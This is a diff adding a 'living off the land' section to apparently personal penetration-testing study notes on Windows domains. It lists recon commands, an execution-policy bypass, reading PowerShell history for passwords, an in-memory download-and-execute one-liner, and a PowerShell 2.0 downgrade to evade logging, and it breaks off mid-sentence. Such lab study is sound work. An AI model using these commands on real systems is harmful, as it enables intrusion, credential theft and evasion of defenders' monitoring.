@@ -197,3 +197,43 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 ### BloodHound / SharpHound
 ![[BloodHound#Summary]]
 ![[BloodHound#Collecting from Windows]]
+## Living off the land in Windows
+### Basic recon commands
+These commands can all be summarised with `systeminfo` but being able to run individual parts sometimes can be useful to get specific information.
+
+| Command                                                 | Result                                                                            |
+| ------------------------------------------------------- | --------------------------------------------------------------------------------- |
+| `hostname`                                              | Prints the PC's name                                                              |
+| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                      |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                               |
+| `ipconfig /all`                                         | Prints out network adapter state and configurations                               |
+| `set`                                                   | Displays a list of environment variables for the current session (*ran from CMD*) |
+| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (*ran from CMD*)               |
+| `echo %logonserver%`                                    | Prints the name of the Domain controller the host checks in with (*ran from CMD*) |
+### Useful PowerShell Cmdlets
+| Cmd-Let                                                                                                    | Description                                                                                                                                                                             |
+| ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Get-Module`                                                                                               | Lists available modules loaded for usage                                                                                                                                                |
+| `Get-ExecutionPolicy -List`                                                                                | Prints the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) for each scope on a host |
+| `Set-ExecutionPolicy Bypass -Scope Process`                                                                | Changes the policy for our current process using the `-Scope` parameter. This change will be reverted once we vacate the process or terminate it. (*No lasting changes*)                |
+| `Get-ChildItem Env: \| ft Key,Value`                                                                       | Return env vars                                                                                                                                                                         |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                 | Get user's powershell history, could show commands and passwords or point to valuable files                                                                                             |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('[url-to-download]'); <follow-on-cmds>"` | Quick and easy way to download a file from a url and call it from memory                                                                                                                |
+### Avoiding PowerShell Logging
+PowerShell was only given event logging in version 3.0+. Therefore, if we can downgrade to run version 2.0 or older, in theory, we shouldn't be logged in Event Viewer.
+```PowerShell
+Get-host
+
+Name    : ConsoleHost
+Version : 5.1.19041.1320 <- this is the PowerShell version
+```
+```PowerShell
+powershell.exe -version 2
+```
+```PowerShell
+Get-host
+
+Name    : ConsoleHost
+Version : 2.0 <- Downgraded to v2.0
+```
+> The best place to look for if we are not appearing in logs is: 
